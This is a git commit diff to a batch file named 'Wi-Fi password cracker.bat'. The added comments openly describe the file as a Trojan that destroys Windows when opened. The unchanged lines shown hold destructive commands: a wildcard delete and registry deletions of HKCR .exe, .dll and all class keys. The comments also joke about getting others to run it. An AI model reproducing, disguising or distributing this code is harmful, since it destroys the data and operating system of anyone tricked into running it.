c1be6f05b89bc8c6ce4ec49ac5ad128cc75c3586
Varun Banka <88031057+VarunBanka@users.noreply.github.com>
2022-10-02 12:50:03 +0530

    added comments that may help other devs

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -28,3 +28,31 @@ del*.*
 START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
+
+
+rem Disclamer
+rem This is made for fun only, do NOT use this for un-ethical purposes and if you do, I'm not responsible
+
+rem IF YOU WILL SEND THIS TO HACKER VARUN, HE WILL HELP YOU CHANGING YOUR SOCIAL MEDIA ACCOUNT'S PASSWORD AND TELL YOU YOUR IP ADDRESS FOR FREE
+
+rem AND REMEMBER HACKING IS ILLEGAL, OF YOU GET CAUGHT, DO NOT TELL THEN YOU KNOW WHO IS HACKER VARUN BANKA
+
+rem And don't use this in your school or office
+
+rem Requirements
+rem Brain
+
+rem Common sense
+
+rem Windows os (because this will only work on windows)
+
+rem What's a Trojan ?
+rem Google it xd
+
+rem Apart from jokes, "A Trojan horse, or Trojan, is a type of malicious code or software that looks legitimate but can take control of your computer. A Trojan is designed to damage, disrupt, steal, or in general inflict some other harmful action on your data or network. A Trojan acts like a bona fide application or file to trick you."
+
+rem What will happen from this trojan ?
+rem After opening "Wi-fi cracker.bat", some commands will be executed which will destroy the whole os
+
+rem How to fix
+rem Reinstall the OS
